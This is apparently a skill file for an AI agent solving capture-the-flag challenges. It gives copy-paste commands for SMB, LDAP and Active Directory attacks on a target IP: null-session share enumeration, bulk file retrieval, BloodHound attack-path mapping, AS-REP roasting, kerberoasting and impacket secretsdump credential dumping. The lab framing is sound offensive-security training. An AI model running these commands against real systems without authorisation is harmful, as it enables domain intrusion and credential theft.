---
description: Enumerate SMB/LDAP/Active Directory - shares, null sessions, users (smbclient, smbmap, enum4linux-ng, impacket, bloodhound-python).
---
# smb-enum - enumerate SMB/Windows/AD and pull files

## When to use
Ports **139/445** (SMB), **389/636** (LDAP), or **88** (Kerberos) are open, or the
challenge is **Active Directory / Windows**. Use this to list shares, read files,
enumerate users/domain info, and check anonymous/null-session access - the flag is
often a file on an open share or a user attribute.

## Fastest path (copy-paste)
```sh
/skills/smb-enum/smb-enum.sh "$HAL_TARGET_IP"
```
The helper tries a null/guest session with `smbclient`, `smbmap`, and
`enum4linux-ng`, lists shares/users/permissions, and greps readable files for
the flag.

## Manual commands
```sh
# list shares, null session:
smbclient -N -L "//$HAL_TARGET_IP/"
smbmap -H "$HAL_TARGET_IP" -u '' -p ''
# full null-session sweep (users, shares, groups, os):
enum4linux-ng -A "$HAL_TARGET_IP"
# connect to a share and grab files:
smbclient -N "//$HAL_TARGET_IP/<share>" -c 'recurse ON; ls; mget *'
```

## Map the domain with BloodHound (once you have any creds)
```sh
bloodhound-python -u USER -p PASS -d <domain> -ns "$HAL_TARGET_IP" -c All --zip
# produces .json/.zip of users, groups, ACLs, and attack paths to Domain Admin.
```

## With credentials (from an earlier step)
```sh
smbmap -H "$HAL_TARGET_IP" -u USER -p PASS               # shares you can now read
smbclient "//$HAL_TARGET_IP/<share>" -U "USER%PASS" -c 'recurse ON; prompt OFF; mget *'
# AS-REP roast / kerberos (needs a username list or a known user):
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt
impacket-GetUserSPNs <domain>/USER:PASS -dc-ip "$HAL_TARGET_IP" -request  # kerberoast
# dump secrets once you have admin creds:
impacket-secretsdump USER:PASS@$HAL_TARGET_IP
```

## Other Windows services
- **LDAP 389** → `ldapsearch -x -H ldap://$HAL_TARGET_IP -s base namingcontexts`
- **WinRM 5985** → python `pypsrp`/`pywinrm` (installed) to run commands.
- **MSSQL 1433** → `impacket-mssqlclient USER:PASS@$HAL_TARGET_IP`
